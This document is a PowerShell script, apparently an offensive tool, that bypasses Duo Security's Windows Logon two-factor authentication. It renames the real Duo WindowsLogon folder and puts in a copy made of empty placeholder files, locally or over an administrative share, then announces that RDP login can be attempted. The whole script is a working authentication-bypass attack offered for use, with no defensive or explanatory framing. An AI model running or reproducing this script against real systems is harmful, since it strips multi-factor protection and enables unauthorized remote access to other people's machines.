
# Make sure to be in the root of Program Files, usually C:\ or \\PCNAME\C$ directory before running this script.

Write-Host "[+] Duplicate WindowsLogon directory with empty files same names"

$basePath = ".\Program Files\Duo Security\WindowsLogon"
$dupFolderLocal = $basePath + ".\duplicate"

# 1) Create "duplicate" folder and generate empty files with same names
if (!(Test-Path -Path $dupFolderLocal)) {
    New-Item -ItemType Directory -Path $dupFolderLocal | Out-Null
}

$files = Get-ChildItem -File -Path $basePath
foreach ($file in $files) {
    $newFilePath = Join-Path -Path $dupFolderLocal -ChildPath $file.Name
    New-Item -ItemType File -Path $newFilePath -Force | Out-Null
}

Write-Host "[+] Created $($files.Count) empty files in the 'duplicate' folder."

Write-Host "[+] Preparing Path information for WindowsLogon"

# 2) Prepare paths for WindowsLogon
$timestamp       = Get-Date -Format "yyyyMMdd-HHmmss"
$winLogonOldName = "WindowsLogon-old-$timestamp"
$winLogonOldPath = $basePath.Replace("WindowsLogon", $winLogonOldName)
$newdupFolderLocal = $winLogonOldPath + "\duplicate"
Write-Host "[+] Renaming WindowsLogon"

# 3) Rename WindowsLogon -> WindowsLogon-old-<timestamp> if it exists
if (Test-Path $basePath) {
    try {
        Rename-Item -Path $basePath -NewName $winLogonOldName -ErrorAction Stop
        Write-Host " - Renamed: 'WindowsLogon' -> '$winLogonOldName'."
    }
    catch {
        Write-Error " - Failed to rename 'WindowsLogon': $($_.Exception.Message)"
    }
} else {
    Write-Host "[-] No existing 'WindowsLogon' folder found, skipping rename."
}

Write-Host "[+] Moving duplicate to WindowsLogon"
# 4) Move 'duplicate' to destination and rename to 'WindowsLogon'
if (!(Test-Path $newdupFolderLocal)) {
    Write-Error " - The local 'duplicate' folder was not found at $newdupFolderLocal."
}

if (Test-Path $basePath) {
    Write-Error " - Destination '$basePath' already exists. Aborting to prevent overwrite."
}

try {
    Move-Item -Path $newdupFolderLocal -Destination $basePath -ErrorAction Stop
    Write-Host " - Moved and renamed: 'duplicate' -> '$basePath'."
}
catch {
    Write-Error " - Failed to move 'duplicate': $($_.Exception.Message)"
}

Write-Host "[+] Duo Security Bypass complete sucessfully, try to login with RDP now" 
